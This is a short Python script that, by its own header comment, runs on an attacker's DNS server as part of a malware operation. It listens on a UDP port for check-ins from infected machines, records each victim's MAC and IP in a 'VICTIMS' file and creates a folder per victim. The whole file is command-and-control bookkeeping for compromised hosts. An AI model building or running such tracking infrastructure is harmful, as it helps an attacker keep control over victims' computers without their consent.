#!/usr/bin/env python
# RUNS ON THE DNS SERVER, LISTENING TO NEW MALWARES AND UPDATING VICTIMS LIST

import socket
import os
import sys

PORT = 1030
VICTIMS_FILE = 'VICTIMS'

def insert_victim(mac, ip):
    new_lines = []
    # Get lines
    with open(VICTIMS_FILE) as f:
        lines = f.readlines()
    # Check if victim already is in the file
    for line in lines:
        if not (line.startswith(mac)):
            new_lines.append(line.rstrip('\n'))
    # Add new victim
    new_lines.append(mac + ';' + ip)
    # Save file
    with open(VICTIMS_FILE, 'w') as f:
        f.write('\n'.join(new_lines))

while(1):
    # Listen to victim's signal
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', PORT))
    data, addr = sock.recvfrom(512)
    mac, ip = data.split(';')
    # Create folder for this victim
    if not os.path.exists(mac):
        os.makedirs(mac)
    sock.close()
    # Insert in the file
    insert_victim(mac, ip)